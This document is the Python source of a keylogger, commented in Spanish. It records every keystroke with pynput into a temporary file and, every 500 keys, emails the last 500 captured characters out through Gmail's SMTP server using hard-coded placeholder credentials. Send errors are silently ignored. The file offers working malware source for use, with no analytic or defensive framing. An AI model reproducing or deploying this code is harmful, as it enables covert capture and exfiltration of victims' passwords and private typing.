import datetime
from itertools import count
import smtplib
from pynput.keyboard import Listener
import ssl
import time
import tempfile

x = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')

#p = open(f'keylogger.txt', 'w')

count = 0
p = tempfile.TemporaryFile('w+t')


def send_email(message):

    try:

        # Datos
        fromaddr = 'correo@gmail.com'
        toaddrs = 'correo@gmail.com'
        username = 'correo@gmail.com'
        password = 'pass'

        # Enviando el correo
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(username, password)
        server.sendmail(fromaddr, toaddrs, message)
        server.quit()

    except:

        pass


def registro(key):
    global count
    count += 1
    llave = str(key)
    if llave != "'\\x00'":

        #p = open('keylogger.txt', 'r+')
        p.seek(0)
        buffer = p.read()

        if llave == "'\\x03'":
            p.close()
            quit()

        if llave == 'Key.enter':

            p.write('\n')

        elif llave == 'Key.space':

            p.write(' ')

        elif llave == 'Key.backspace':

            p.write('%')

        else:

            p.write(llave.replace("'", ""))

        if count == 500:

            capturado = buffer[-500:].replace('\n', ' ')
            # print(capturado)
            send_email(capturado)
            count = 0


with Listener(on_press=registro) as u:
    u.join()
